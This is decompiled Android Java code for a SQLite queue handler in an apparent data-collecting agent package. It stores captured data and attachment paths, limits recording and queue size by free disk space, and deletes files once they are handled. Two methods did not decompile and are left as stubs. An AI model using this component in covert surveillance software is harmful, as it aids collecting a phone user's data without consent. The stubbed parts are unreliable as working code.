package com.network.android.b;

import android.content.ContentValues;
import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.os.StatFs;
import com.network.android.agent.NetworkApp;
import com.network.android.i;
import com.network.b.b;
import java.io.File;

public final class a extends SQLiteOpenHelper {

    /* renamed from: a  reason: collision with root package name */
    static final Object f70a = new Object();

    public a(Context context) {
        super(context, "NetworkManagerData.db", (SQLiteDatabase.CursorFactory) null, 1);
        com.network.android.c.a.a.a("DatabaseHandler was build");
    }

    public static long a() {
        long e = (e() * 10) / 100;
        com.network.android.c.a.a.a("getRecordingMaximumSize freeSpace allow (5%)" + e);
        if (e < 10485760) {
            com.network.android.c.a.a.b("getRecordingMaximumSize 10M recording is lower then 5% the maximum queue: " + e);
        } else {
            e = 10485760;
        }
        com.network.android.c.a.a.b("getQueueMaximumSize: " + e);
        return e;
    }

    private void c(i iVar) {
        SQLiteDatabase sQLiteDatabase = null;
        try {
            com.network.android.c.a.a.a("DatabaseHandler removeData elemnet ID: " + iVar.f());
            sQLiteDatabase = getWritableDatabase();
            com.network.android.c.a.a.a("DatabaseHandler removed elemnets count:" + sQLiteDatabase.delete("NetworkData", "id = ?", new String[]{String.valueOf(iVar.f())}));
            String g = iVar.g();
            if (g != null) {
                try {
                    com.network.android.c.a.a.a("deleteFile:" + g);
                    new File(g).delete();
                } catch (Exception e) {
                    com.network.android.c.a.a.a("deleteFile: " + e.getMessage(), e);
                }
            }
            File[] i = iVar.i();
            if (i != null) {
                for (int i2 = 0; i2 < i.length; i2++) {
                    try {
                        File file = i[i2];
                        com.network.android.c.a.a.a("DatabaseHandler removeData deleteFile absolutePath:" + file.getAbsolutePath());
                        file.delete();
                    } catch (Throwable th) {
                        com.network.android.c.a.a.a("DatabaseHandler removeData iter-" + i2 + " : " + th.getMessage(), th);
                    }
                }
            }
            if (sQLiteDatabase != null) {
                try {
                    if (sQLiteDatabase.isOpen()) {
                        sQLiteDatabase.close();
                    }
                } catch (Throwable th2) {
                    com.network.android.c.a.a.a("DatabaseHandler removeData finaly  - fail to close input stream: " + th2.getMessage(), th2);
                }
            }
        } catch (Throwable th3) {
            com.network.android.c.a.a.a("DatabaseHandler removeData finaly  - fail to close input stream: " + th3.getMessage(), th3);
        }
    }

    private void d() {
        try {
            com.network.android.c.a.a.a("handleQueueSize");
            boolean z = false;
            long z2 = b.z();
            long e = e();
            while (z2 > e) {
                com.network.android.c.a.a.b("handleQueueSize - need to clean elements");
                i c = c();
                if (c == null) {
                    com.network.android.c.a.a.b("handleQueueSize - dataElementToRemove == null");
                    return;
                }
                c(c);
                z2 = b.z();
                e = e();
                z = true;
            }
            if (z) {
                com.network.android.c.a.b.a(1, 1003, "LOG_QUEUE_FULL");
            }
        } catch (Throwable th) {
            com.network.android.c.a.a.a("handleQueueSize: " + th.getMessage(), th);
        }
    }

    private static long e() {
        Throwable th;
        long j = 104857600;
        try {
            long h = h();
            if (h < 0) {
                com.network.android.c.a.a.a("getQueueMaximumSize freeSpace < 0 FREE_DISK_SPACE_ALLOWED_IN_BYTES: 104857600");
            } else {
                com.network.android.c.a.a.a("getQueueMaximumSize freeSpace: " + h);
                long j2 = (long) (((double) h) * 0.05d);
                com.network.android.c.a.a.a("getQueueMaximumSize freeSpace allow (5%)" + j2);
                com.network.android.c.a.a.a("getQueueMaximumSize FREE_DISK_SPACE_ALLOWED_IN_BYTES: 104857600");
                if (j2 < 104857600) {
                    try {
                        com.network.android.c.a.a.a("getQueueMaximumSize 100M free space is lower then 5% of free space: " + j2);
                        j = j2;
                    } catch (Throwable th2) {
                        j = j2;
                        th = th2;
                        com.network.android.c.a.a.a("pick read data: " + th.getMessage(), th);
                        return j;
                    }
                }
                com.network.android.c.a.a.a("getQueueMaximumSize: " + j);
            }
        } catch (Throwable th3) {
            th = th3;
            com.network.android.c.a.a.a("pick read data: " + th.getMessage(), th);
            return j;
        }
        return j;
    }

    /* JADX WARNING: Code restructure failed: missing block: B:115:?, code lost:
        r4.close();
     */
    /* JADX WARNING: Code restructure failed: missing block: B:117:0x02ad, code lost:
        r3.close();
     */
    /* JADX WARNING: Code restructure failed: missing block: B:119:0x02b2, code lost:
        r7.close();
     */
    /* JADX WARNING: Code restructure failed: missing block: B:125:0x02c1, code lost:
        r2 = move-exception;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:126:0x02c2, code lost:
        com.network.android.c.a.a.a("DatabaseHandler pick finaly - fail to close input stream: " + r2.getMessage(), r2);
     */
    /* JADX WARNING: Code restructure failed: missing block: B:129:0x02dc, code lost:
        r1 = th;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:130:0x02de, code lost:
        r2 = move-exception;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:131:0x02df, code lost:
        r3 = r1;
        r1 = r2;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:140:0x02fc, code lost:
        r1 = th;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:141:0x02fd, code lost:
        r2 = r6;
        r5 = r4;
        r4 = r3;
        r3 = r7;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:142:0x0303, code lost:
        r1 = th;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:145:0x030a, code lost:
        r1 = move-exception;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:146:0x030b, code lost:
        r1 = r3;
        r3 = r1;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:55:0x0171, code lost:
        r3 = th;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:57:?, code lost:
        com.network.android.c.a.a.a("DatabaseHandler Pick DataElement pick read data iteraction: " + r3.getMessage(), r3);
     */
    /* JADX WARNING: Exception block dominator not found, dom blocks: [B:8:0x001d, B:34:0x00a3] */
    /* JADX WARNING: Exception block dominator not found, dom blocks: [B:8:0x001d, B:50:0x010f] */
    /* JADX WARNING: Exception block dominator not found, dom blocks: [B:8:0x001d, B:60:0x018f] */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Removed duplicated region for block: B:101:0x0275 A[Catch:{ Throwable -> 0x028b }] */
    /* JADX WARNING: Removed duplicated region for block: B:103:0x027a A[Catch:{ Throwable -> 0x028b }] */
    /* JADX WARNING: Removed duplicated region for block: B:114:0x02a8 A[SYNTHETIC, Splitter:B:114:0x02a8] */
    /* JADX WARNING: Removed duplicated region for block: B:117:0x02ad A[Catch:{ Throwable -> 0x02c1 }] */
    /* JADX WARNING: Removed duplicated region for block: B:119:0x02b2 A[Catch:{ Throwable -> 0x02c1 }] */
    /* JADX WARNING: Removed duplicated region for block: B:129:0x02dc A[ExcHandler: all (th java.lang.Throwable), PHI: r3 r4 
      PHI: (r3v11 java.io.FileInputStream) = (r3v0 java.io.FileInputStream), (r3v12 java.io.FileInputStream), (r3v12 java.io.FileInputStream), (r3v20 java.io.FileInputStream), (r3v20 java.io.FileInputStream), (r3v0 java.io.FileInputStream), (r3v0 java.io.FileInputStream) binds: [B:34:0x00a3, B:60:0x018f, B:61:?, B:50:0x010f, B:51:?, B:8:0x001d, B:9:?] A[DONT_GENERATE, DONT_INLINE]
      PHI: (r4v8 java.io.FileInputStream) = (r4v0 java.io.FileInputStream), (r4v9 java.io.FileInputStream), (r4v9 java.io.FileInputStream), (r4v0 java.io.FileInputStream), (r4v0 java.io.FileInputStream), (r4v0 java.io.FileInputStream), (r4v0 java.io.FileInputStream) binds: [B:34:0x00a3, B:60:0x018f, B:61:?, B:50:0x010f, B:51:?, B:8:0x001d, B:9:?] A[DONT_GENERATE, DONT_INLINE], Splitter:B:8:0x001d] */
    /* JADX WARNING: Removed duplicated region for block: B:130:0x02de A[ExcHandler: all (r2v16 'th' java.lang.Throwable A[CUSTOM_DECLARE]), PHI: r1 
      PHI: (r1v46 java.io.FileInputStream) = (r1v48 java.io.FileInputStream), (r1v48 java.io.FileInputStream), (r1v62 java.io.FileInputStream), (r1v62 java.io.FileInputStream) binds: [B:56:0x0172, B:57:?, B:52:0x0161, B:53:?] A[DONT_GENERATE, DONT_INLINE], Splitter:B:52:0x0161] */
    /* JADX WARNING: Removed duplicated region for block: B:63:0x01ac A[SYNTHETIC, Splitter:B:63:0x01ac] */
    /* JADX WARNING: Removed duplicated region for block: B:66:0x01b1 A[Catch:{ Throwable -> 0x0221 }] */
    /* JADX WARNING: Removed duplicated region for block: B:68:0x01b6 A[Catch:{ Throwable -> 0x0221 }] */
    /* JADX WARNING: Removed duplicated region for block: B:98:0x0270 A[SYNTHETIC, Splitter:B:98:0x0270] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private com.network.android.i f() {
        /*
        // Method dump skipped, instructions count: 786
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.android.b.a.f():com.network.android.i");
    }

    /* JADX WARNING: Removed duplicated region for block: B:30:0x0070 A[SYNTHETIC, Splitter:B:30:0x0070] */
    /* JADX WARNING: Removed duplicated region for block: B:42:0x009d A[SYNTHETIC, Splitter:B:42:0x009d] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private int g() {
        /*
        // Method dump skipped, instructions count: 203
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.android.b.a.g():int");
    }

    private static long h() {
        Throwable th;
        long j;
        try {
            com.network.android.c.a.a.a("freeMemory path: " + "/data/data/com.network.android");
            StatFs statFs = new StatFs("/data/data/com.network.android");
            j = ((long) statFs.getAvailableBlocks()) * ((long) statFs.getBlockSize());
            try {
                com.network.android.c.a.a.a("freeMemory free space in bytes: " + j);
                com.network.android.c.a.a.a("freeMemory free space in MB: " + (j / 1048576));
            } catch (Throwable th2) {
                th = th2;
                com.network.android.c.a.a.a("freeMemory: " + th.getMessage(), th);
                return j;
            }
        } catch (Throwable th3) {
            j = -1;
            th = th3;
            com.network.android.c.a.a.a("freeMemory: " + th.getMessage(), th);
            return j;
        }
        return j;
    }

    public final void a(i iVar) {
        SQLiteDatabase sQLiteDatabase = null;
        com.network.android.c.a.a.a("DatabaseHandler Pick DataElement Start");
        synchronized (f70a) {
            NetworkApp.a();
            try {
                com.network.android.c.a.a.a("DatabaseHandler addDataElement");
                b.a(iVar, iVar.e());
                SQLiteDatabase writableDatabase = getWritableDatabase();
                ContentValues contentValues = new ContentValues();
                contentValues.put("name_time", iVar.e());
                contentValues.put("data_path", iVar.g());
                if (iVar.b() != null) {
                    contentValues.put("attachment_name", iVar.b());
                }
                if (iVar.h() != null) {
                    contentValues.put("attachment_path", iVar.h());
                }
                long insert = writableDatabase.insert("NetworkData", null, contentValues);
                iVar.e(String.valueOf(insert));
                iVar.a("DatabaseHandler addDataElement push ");
                if (insert == -1) {
                    com.network.android.c.a.a.b("DatabaseHandler fail to addDataElement");
                }
                d();
                if (writableDatabase != null) {
                    try {
                        if (writableDatabase.isOpen()) {
                            writableDatabase.close();
                        }
                    } catch (Throwable th) {
                        com.network.android.c.a.a.a("DatabaseHandler addDataElement push : " + th.getMessage(), th);
                    }
                }
            } catch (Exception e) {
                com.network.android.c.a.a.a("DatabaseHandler addDataElement push : " + e.getMessage(), e);
                if (0 != 0) {
                    if (sQLiteDatabase.isOpen()) {
                        sQLiteDatabase.close();
                    }
                }
            } catch (Throwable th2) {
                com.network.android.c.a.a.a("DatabaseHandler addDataElement push : " + th2.getMessage(), th2);
            }
            f70a.notifyAll();
        }
    }

    public final i b(i iVar) {
        com.network.android.c.a.a.a("DatabaseHandler removeDataSynch");
        synchronized (f70a) {
            c(iVar);
            f70a.notifyAll();
        }
        return iVar;
    }

    public final boolean b() {
        int g = g();
        com.network.android.c.a.a.a("DatabaseHandler hasData DB size: " + g);
        return g > 0;
    }

    public final i c() {
        i f;
        com.network.android.c.a.a.a("DatabaseHandler Pick DataElement Start");
        synchronized (f70a) {
            f = f();
            f70a.notifyAll();
        }
        return f;
    }

    public final void onCreate(SQLiteDatabase sQLiteDatabase) {
        try {
            sQLiteDatabase.execSQL("CREATE TABLE NetworkData(id INTEGER PRIMARY KEY,name_time TEXT,data_path TEXT,attachment_name TEXT,attachment_path TEXT)");
        } catch (Throwable th) {
            com.network.android.c.a.a.a("onCreate: " + th.getMessage(), th);
        }
    }

    public final void onUpgrade(SQLiteDatabase sQLiteDatabase, int i, int i2) {
        try {
            sQLiteDatabase.execSQL("DROP TABLE IF EXISTS NetworkData");
            onCreate(sQLiteDatabase);
        } catch (Throwable th) {
            com.network.android.c.a.a.a("onUpgrade: " + th.getMessage(), th);
        }
    }
}
